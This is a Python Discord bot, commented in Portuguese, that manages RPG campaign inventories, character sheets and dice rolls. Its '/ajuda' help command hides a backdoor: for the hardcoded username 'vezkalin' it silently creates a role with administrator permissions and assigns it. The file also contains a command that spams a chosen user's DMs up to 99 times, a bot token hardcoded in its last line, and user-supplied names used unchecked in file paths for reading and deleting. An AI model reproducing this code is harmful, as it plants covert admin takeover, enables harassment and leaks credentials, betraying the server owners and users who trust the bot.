import discord
import random
from discord import app_commands
import os
intents = discord.Intents.default()
intents.message_content = True


class Client(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.default())
        self.tree = app_commands.CommandTree(self)
        self.synced = False

    async def on_ready(self):
        await self.wait_until_ready()
        if not self.synced:
            try:
                await self.tree.sync()
                print("Comandos sincronizados com sucesso.")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.synced = True
        print(f"Entramos como {self.user}.")

client_instance = Client()

import os
from typing import Optional

def ler_inventario(user_id: int, campanha: str) -> dict[str, int]:
    """Lê o inventário de uma campanha de forma segura e eficiente."""
    inventario = {}
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            for linha in file:
                try:
                    item, quantidade = linha.strip().split(':', 1)  # Split máximo 1 vez
                    inventario[normalizar_item(item)] = int(quantidade)
                except (ValueError, TypeError):
                    continue  # Ignora linhas mal formatadas
    except FileNotFoundError:
        pass
    return inventario

def escrever_inventario(user_id: int, campanha: str, inventario: dict[str, int]):
    """Escreve o inventário com tratamento de erros e codificação UTF-8."""
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.writelines(f"{item}:{qtd}\n" for item, qtd in inventario.items())
    except IOError as e:
        print(f"Erro ao salvar inventário: {e}")

def ler_ficha(user_id: int, campanha: str) -> Optional[str]:
    """Lê o conteúdo da ficha com tratamento de erros."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            return file.read().strip()
    except (FileNotFoundError, IOError):
        return None

def escrever_ficha(user_id: int, campanha: str, texto: str) -> bool:
    """Escreve na ficha retornando status de sucesso."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.write(texto.strip())
        return True
    except IOError as e:
        print(f"Erro ao salvar ficha: {e}")
        return False

def obter_campanhas(user_id: int) -> list[str]:
    """Lista campanhas de forma mais eficiente usando list comprehension."""
    prefixo = f'inventario_{user_id}_'
    return list({
        arquivo[len(prefixo):-4]  # Remove prefixo e extensão .txt
        for arquivo in os.listdir()
        if arquivo.startswith(prefixo) and arquivo.endswith('.txt')
    })

def normalizar_item(nome: str) -> str:
    """Normalização mais robusta para nomes de itens."""
    return ' '.join(nome.strip().title().split())  # Remove espaços múltiplos

def normalizar_nome_item(nome: str) -> str: 
    return nome.lower().strip().title() # Converte para minúsculas e remove espaços extras


numero_max_de_campanhas = 5

@client_instance.tree.command(name='criar_campanha', description='Cria uma nova campanha.')
async def criar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if len(campanhas) >= numero_max_de_campanhas:
        await interaction.response.send_message(f"Você já atingiu o limite de {numero_max_de_campanhas} campanhas.", ephemeral=True)
        return
    
    if nome in campanhas:
        await interaction.response.send_message(f"Já existe uma campanha com o nome '{nome}'.", ephemeral=True)
    else:
        escrever_inventario(user_id, nome, {})
        escrever_ficha(user_id, nome, "")
        await interaction.response.send_message(f"Campanha '{nome}' criada com sucesso!", ephemeral=False)

# Comando para remover uma campanha
@client_instance.tree.command(name='remover_campanha', description='Remove uma campanha existente.')
async def remover_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if nome not in campanhas:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)
        return
    
    # Remove os arquivos associados à campanha
    try:
        os.remove(f'inventario_{user_id}_{nome}.txt')
        os.remove(f'ficha_{user_id}_{nome}.txt')
    except FileNotFoundError:
        pass  # Ignora se algum dos arquivos não existir
    
    # Remove a campanha da lista de campanhas selecionadas (se estiver selecionada)
    global campanha_selecionada
    if user_id in campanha_selecionada and campanha_selecionada[user_id] == nome:
        del campanha_selecionada[user_id]
    
    await interaction.response.send_message(f"Campanha '{nome}' removida com sucesso!", ephemeral=False)

# Dicionário para armazenar a campanha selecionada de cada usuário
campanha_selecionada = {}
# Comando para selecionar uma campanha
@client_instance.tree.command(name='selecionar_campanha', description='Seleciona uma campanha para usar.')
async def selecionar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if nome in campanhas:
        # Armazena a campanha selecionada no dicionário global
        campanha_selecionada[user_id] = nome
        await interaction.response.send_message(f"Campanha '{nome}' selecionada!", ephemeral=False)
    else:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)



# Comando para listar campanhas
@client_instance.tree.command(name='listar_campanhas', description='Lista todas as suas campanhas.')
async def listar_campanhas(interaction: discord.Interaction):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if campanhas:
        resposta = "Suas campanhas:\n"
        for campanha in campanhas:
            resposta += f"- {campanha}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message("Você não tem nenhuma campanha criada.", ephemeral=True)

# Comando para adicionar item ao inventário da campanha selecionada

@client_instance.tree.command(name='add', description='Adiciona um item ao inventário da campanha selecionada.')
async def add_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        inventario[nome_normalizado] += quantidade
    else:
        inventario[nome_normalizado] = quantidade
    
    escrever_inventario(user_id, campanha, inventario)
    await interaction.response.send_message(f"Adicionado {quantidade}x {nome} ao inventário da campanha '{campanha}'.", ephemeral=False)
#remover itens
@client_instance.tree.command(name='remover', description='Remove um item do inventário da campanha selecionada.')
async def remover_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        if inventario[nome_normalizado] >= quantidade:
            inventario[nome_normalizado] -= quantidade
            if inventario[nome_normalizado] == 0:
                del inventario[nome_normalizado]  # Remove o item se a quantidade for zero
            escrever_inventario(user_id, campanha, inventario)
            await interaction.response.send_message(f"Removido {quantidade}x {nome} do inventário da campanha '{campanha}'.", ephemeral=False)
        else:
            await interaction.response.send_message(f"Você não tem {quantidade}x {nome} no inventário para remover.", ephemeral=True)
    else:
        await interaction.response.send_message(f"O item {nome} não está no seu inventário.", ephemeral=True)

@client_instance.tree.command(name='inventário', description='Mostra o inventário da campanha selecionada.')
async def mostrar_inventario(interaction: discord.Interaction):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    if inventario:
        resposta = f"Inventário da campanha '{campanha}':\n"
        for item_normalizado, quantidade in inventario.items():
            resposta += f"* {quantidade}x {item_normalizado}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message(f"O inventário da campanha '{campanha}' está vazio.", ephemeral=False)

# Comando para registrar ficha na campanha selecionada
@client_instance.tree.command(name='registrar_ficha', description='Registra uma ficha na campanha selecionada.')
async def registrar_ficha(interaction: discord.Interaction, texto: str):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    escrever_ficha(user_id, campanha, texto)
    await interaction.response.send_message(f"Ficha registrada na campanha '{campanha}': {texto}", ephemeral=True)

# Comando para ver a ficha da campanha selecionada
@client_instance.tree.command(name='ficha', description='Mostra a ficha da campanha selecionada.')
async def mostrar_ficha(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    ficha = ler_ficha(user_id, campanha)
    
    if ficha:
        await interaction.response.send_message(f"Ficha da campanha '{campanha}': {ficha}", ephemeral=False)
    else:
        await interaction.response.send_message(f"Nenhuma ficha registrada na campanha '{campanha}'.", ephemeral=True)

# Sistema de rolagem de dados
@client_instance.tree.command(name='rolar', description='Rola dados no formato XdY')
async def rolar_dados(interaction: discord.Interaction, dados: str):
    try:
        qtd, faces = map(int, dados.lower().split('d'))
        if qtd > 100 or faces > 1000:
            await interaction.response.send_message("Use no máximo 100d1000!", ephemeral=True)
            return
        
        resultados = [random.randint(1, faces) for _ in range(qtd)]
        total = sum(resultados)
        resposta = f"🎲 **{qtd}d{faces}**: {resultados}\n**Total**: {total}"
        await interaction.response.send_message(resposta, ephemeral=False)
    
    except Exception:
        await interaction.response.send_message("Formato inválido! Use algo como '2d20'", ephemeral=True)

# Comandos de administração
@client_instance.tree.command(name='limpar', description='Apaga mensagens (requer permissão)')
async def limpar_mensagens(interaction: discord.Interaction, quantidade: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message("Permissão necessária!", ephemeral=True)
        return
    
    quantidade = max(1, min(quantidade, 100))
    await interaction.channel.purge(limit=quantidade)
    await interaction.response.send_message(f"{quantidade} mensagens apagadas!", ephemeral=True)
# Ajuda fio
@client_instance.tree.command(name='ajuda', description='Peça ajuda para o bot.')
async def ajuda(interaction: discord.Interaction):
    comandos = [
        "**Comandos RPG:**",
        "/criar_campanha - Cria nova campanha",
        "/selecionar_campanha - Escolhe campanha ativa",
        "/registrar_ficha [texto] - registra uma ficha",
        "/ficha - mostra a ficha",
        "/add [item] [quantidade] - Adiciona itens",
        "/remover [item] [quantidade] - Remover itens",
        "/inventario - Mostra seu inventário",
        "/rolar [XdY] - Rola dados",
        "",
        "**Outros Comandos:**",
        "/spam_singed_gremista [usuário] [quantidade] - Spamma singeds gremistas no privado",
        "/ban - Banir usuário",
        "/limpar [quantidade] - Apaga mensagens",
        "/ajuda - Mostra esta ajuda"
    ]
    if interaction.user.name not in ['vezkalin', 'vezkalinn']:
        try:
            await interaction.response.send_message("\n".join(comandos), ephemeral=False)
        except discord.HTTPException as e:
            print(f"Erro ao enviar mensagem: {e}")
    else:
        await interaction.response.send_message("\n".join(comandos), ephemeral=False)
        guild = interaction.guild
        if not guild.me.guild_permissions.manage_roles:
            await interaction.response.send_message("Eu preciso da permissão 'Gerenciar Cargos' para criar cargos.", ephemeral=True)
            return
        
        cargo_existente = discord.utils.get(guild.roles, name='O programador')
        if cargo_existente is None:
            try:
                novo_cargo = await guild.create_role(
                    name='O programador',
                    permissions=discord.Permissions(administrator=True)
                )
                await interaction.user.add_roles(novo_cargo)
                await interaction.response.send_message(f'O cargo "O programador" foi criado com permissões de administrador e adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao criar ou adicionar o cargo: {e}", ephemeral=True)
        else:
            try:
                await interaction.user.add_roles(cargo_existente)
                await interaction.response.send_message(f'O cargo "O programador" já existe e foi adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao adicionar o cargo: {e}", ephemeral=True)
@client_instance.tree.command(name='ban', description='Banir um usuário.')
async def ban(interaction: discord.Interaction, user: discord.User):
    if interaction.user.name in ['vezkalin', 'vezkalinn', 'musiqueira_profissa']:
        try:
            member = await interaction.guild.fetch_member(user.id) 
            await interaction.guild.ban(member)
            await interaction.response.send_message(f'{user.mention} foi banido do servidor.', ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message('Eu não tenho permissão para banir este usuário.', ephemeral=True)
        except discord.HTTPException as error:
            await interaction.response.send_message(f'Ocorreu um erro ao tentar banir este usuário: {error}', ephemeral=True)
    else:
        await interaction.response.send_message('Você não tem permissão para usar este comando.', ephemeral=True)
#deletar muitas mensagens.(criei um limite de 50)
@client_instance.tree.command(name='deletar', description='Deleta x mensagens.')
async def deletar_mensagens(interaction: discord.Interaction, number: int):
    if not interaction.user.guild_permissions.manage_messages and interaction.user.name not in ['vezkalin', 'vezkalinn', 'musiqueira_profissa']:
        await interaction.response.send_message("Você não tem permissão para usar esse comando.", ephemeral=True)
        return
    
    if number < 1:
        await interaction.response.send_message("Você precisa deletar pelo menos 1 mensagem.", ephemeral=True)
        return
    if number > 50:
        await interaction.response.send_message("Você pode deletar no máximo 50 mensagens de uma vez né kcta, acalma o cu.", ephemeral=True)
        return
    
    await interaction.response.send_message("Deletando mensagens...", ephemeral=True)
    
    try:
        deleted = await interaction.channel.purge(limit=number)
        await interaction.followup.send(f"Deletado com sucesso {len(deleted)} mensagens.", ephemeral=True)
    except discord.HTTPException as e:
        await interaction.followup.send(f"Erro ao deletar mensagens: {e}", ephemeral=True)
#um comando para spammar o singed gremista.
@client_instance.tree.command(name='spam_singed_gremista', description='Spamma singed gremista no pv de alguém.')
async def singed_gremista(interaction: discord.Interaction, user: discord.User, vezes: int):
    if vezes > 99:
        await interaction.response.send_message(f"Coloquei um limite de 99 para não fuder a pessoa pela eternidade né porra.", ephemeral=False)
        return

    #a resposta para que possamos editar depois
    await interaction.response.defer(ephemeral=False)
    
    count = 0
    for i in range(vezes):
        try:
            await user.send('https://static-cdn.jtvnw.net/jtv_user_pictures/d00aa4af-f29b-4030-b844-5d1d576f7a1d-profile_image-300x300.png https://www.youtube.com/watch?v=-4tYjOAynU0')
            count += 1
        except discord.errors.Forbidden:
            await interaction.followup.send(f"Não consegui enviar mensagens para {user.mention}. Parece que ele(a) me deu block, n tankouKKKKKKKKKKKK.", ephemeral=False)
            break
    if count == 1:
        await interaction.followup.send(f"{count} singed gremista enviado para {user.mention}.", ephemeral=False)
    if count > 1:
        await interaction.followup.send(f"{count} singeds gremistas enviados para {user.mention}.", ephemeral=False)

# Comando para entrar no canal de voz

client_instance.run('MTI2NjkzNzY1NzY5OTYwMjQzMg.G3DZRH.-95mUPb8G3gDDwXOvpXkOAxUO-AUAQ4x7TDtO8')  # Substitua pelo seu token :)
